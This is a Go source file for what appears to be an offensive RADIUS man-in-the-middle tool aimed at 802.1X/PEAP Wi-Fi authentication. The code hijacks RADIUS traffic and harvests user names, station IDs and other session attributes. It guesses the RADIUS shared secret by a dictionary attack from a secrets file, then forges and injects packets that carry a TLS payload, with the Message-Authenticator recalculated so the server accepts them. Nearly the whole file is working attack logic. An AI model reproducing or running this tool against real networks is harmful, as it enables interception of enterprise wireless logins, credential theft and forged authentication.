package main

import (
	"crypto/rand"
	"flag"
	"fmt"
	"net"
	"os"
	"radius/eap"
	"radius/radius"
	"radius/session"
)

const authPort = 1812
const accPort = 1813

const hostName = "169.254.63.10"

const wireless80211Port = 19

var mySession session.Session

func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, clientToServer bool) bool {

	var client, server net.UDPAddr

	//Determine client and server
	if clientToServer {
		client = from
		server = to
	} else {
		client = to
		server = from
	}

	if server.Port == accPort {
		return true //At the moment, we do not do anything for Accounting messages
	}

	fmt.Println()
	fmt.Println()
	fmt.Println()

	fmt.Println("¡¡¡PACKAGE RECEIVED!!!")

	//Print some useful information about the packet
	fmt.Println("Pck rcv from ", from, "to", to)
	fmt.Println("Code:", manglePacket.GetCode())
	fmt.Println("Id:", manglePacket.GetId())

	//Get the session context by means of the client address
	context := session.GetContextByClient(client)

	if manglePacket.GetCode() == radius.AccessChallenge {

		//Now, we know the state attribute
		if ok, state := manglePacket.GetState(); ok {
			context.SetState(state)
		}

	}

	if manglePacket.GetCode() == radius.AccessRequest {

		//Retrieve basic information about the client
		//NAS Port Type
		if ok, nasPortType := manglePacket.GetNASPortType(); ok {
			context.SetNasPortType(nasPortType)

			if nasPortType == wireless80211Port {
				fmt.Println("WIFI network Authetication!!")

				//Set the current user name if not done before
				if ok, user := manglePacket.GetUserName(); ok {
					context.SetUserName(user)
				}

				//Set calling station
				if ok, callingSta := manglePacket.GetCallingSTAID(); ok {
					context.SetCallingStation(callingSta)
				}

			}

		}

		//NAS Port
		if ok, nasPort := manglePacket.GetNASPort(); ok {
			context.SetNasPort(nasPort)
		}

		//NAS IP
		if ok, nasIP := manglePacket.GetNASIp(); ok {
			context.SetNasIP(nasIP)
		}

		//Called STA
		if ok, calledSTA := manglePacket.GetCalledSTAID(); ok {
			context.SetCalledStation(calledSTA)
		}

		//Framed MTU
		if ok, framedMTU := manglePacket.GetFramedMTU(); ok {
			context.SetFramedMTU(framedMTU)
		}

		//Connect Info
		if ok, connectInfo := manglePacket.GetConnectInfo(); ok {
			context.SetConnectInfo(connectInfo)
		}

		//Acc Session
		if ok, accSession := manglePacket.GetAccountSession(); ok {
			context.SetAccSessionID(accSession)
		}

	}

	//TODO Detect Desired auth type method for EAP.

	//Check if there are EAP messages...

	if ok, eapMsg := manglePacket.GetEAPMessage(); ok {

		//fmt.Println("eapMsg:", eapMsg)

		var eapHeader eap.HeaderEap

		ok = eapHeader.Decode(eapMsg)

		if ok {
			fmt.Println("EAP Decode Code:", eapHeader.GetCode())
			fmt.Println("EAP Decode ID:", eapHeader.GetId())
			fmt.Println("EAP Decode Type:", eapHeader.GetType())
			fmt.Println("EAP Decode Length:", eapHeader.GetLength())

			if eapHeader.GetCode() == eap.EAPRequest || eapHeader.GetCode() == eap.EAPResponse {
				eapPacket := eap.GetEAPByType(eapHeader.GetType())

				ok = eapPacket.Decode(eapMsg)

				if ok {
					fmt.Println("EAP decoded")

					switch eapPacket.GetType() {
					case eap.Identity:
						identPacket := eapPacket.(*eap.EapIdentity)
						if manglePacket.GetCode() == radius.AccessRequest {
							context.SetEAPIdentity(identPacket.GetIdentity()) //Set EAP identity
						} else {

							fmt.Println("Eap identity not expected in this message")
						}
					case eap.LegacyNak:
						legacyNak := eapPacket.(*eap.EapNak)

						fmt.Println("Desired Eap method type to authenticate:", legacyNak.GetDesiredType())

						context.SetEapMethod(uint8(legacyNak.GetDesiredType())) //Set desired EAP method

					case eap.Peap:
						peapPacket := eapPacket.(*eap.EapPeap)
						if manglePacket.GetCode() == radius.AccessChallenge && peapPacket.GetStartFlag() { //A TLS session is about to start
							fmt.Println("PEAP session about to start.")

							//Create a TLS session

							context.CreateTLSSession()

							tlsSession := context.GetTLSSession()

							rawTLSToServer := tlsSession.ServerTLSToRaw(nil)

							fmt.Println("rawTLSToServer:", rawTLSToServer)

							//At this point, we start to manage the session. Send EAP response to server
							craftPacketFromTLSPayload(context, rawTLSToServer, manglePacket.GetId()+1, peapPacket.GetId(), !clientToServer, [16]byte{})

						}
					}
				}
			}

		}

	}

	//Used to determine if we have already the secret, because we have broken it or it is available in the database
	status := context.GetSecretStatus()

	//Check the status concerning the secret for the current context
	switch status {
	case session.SecretUnknown:
		fmt.Println("No secret")
		fmt.Println("Determine secret")
		mySession.GuessSecret(manglePacket.Clone(), client, server, clientToServer)

	case session.SecretOk:

	}

	context.PrintInfo()

	return true

}

func craftPacketFromTLSPayload(context *session.ContextInfo, payload []byte, msgID uint8, eapID uint8, clientToServer bool, authenticator [16]byte) {

	fmt.Println("craftPacketFromTLSPayload Send packet")

	craftedPacket := radius.NewRadiusPacket()
	craftedPacket.SetId(msgID)

	eapMessage := eap.NewEapPeap()
	eapMessage.SetId(eapID)

	//Add TLS payload
	eapMessage.SetTLSPayload(payload)

	if clientToServer {

		craftedPacket.SetCode(radius.AccessRequest)
		eapMessage.SetCode(eap.EAPResponse)

		//Set NAS context into the packet
		craftedPacket.SetUserName(context.GetUserName())
		craftedPacket.SetNASIp(context.GetNasIP())
		craftedPacket.SetCalledSTAID(context.GetCalledStation())
		craftedPacket.SetNASPortType(context.GetNasPortType())
		craftedPacket.SetNASPort(context.GetNasPort())
		craftedPacket.SetCallingSTAID(context.GetCallingStation())
		craftedPacket.SetConnectInfo(context.GetConnectInfo())
		craftedPacket.SetAccountSession(context.GetAccSessionID())
		craftedPacket.SetFramedMTU(context.GetFramedMTU())

		//Generate random Authenticator

		_, err := rand.Read(authenticator[:])

		if err != nil {
			fmt.Println("Error in random function", err)
			return
		}

	} else {

		craftedPacket.SetCode(radius.AccessChallenge)
		eapMessage.SetCode(eap.EAPRequest)

	}

	if ok, encodedPEAP := eapMessage.Encode(); ok {
		craftedPacket.SetEAPMessage(encodedPEAP)
	}

	craftedPacket.SetState(context.GetState())

	//We need to recalculate this attribute, otherwise, the message will be rejected
	radius.RecalculateMsgAuth(craftedPacket, authenticator, context.GetSecret())

	//Send crafted message
	mySession.SendPacket(craftedPacket, clientToServer)

	os.Exit(0)

}

func main() {

	secrets := flag.String("secrets", "secrets.txt", "Secrets file to perform dictionary attacks")

	flag.Parse()

	session.SetConfig(*secrets)

	//Init session

	mySession.Init(session.Active, hostName, authPort, accPort)

	mySession.Hijack(manglePacket)
}
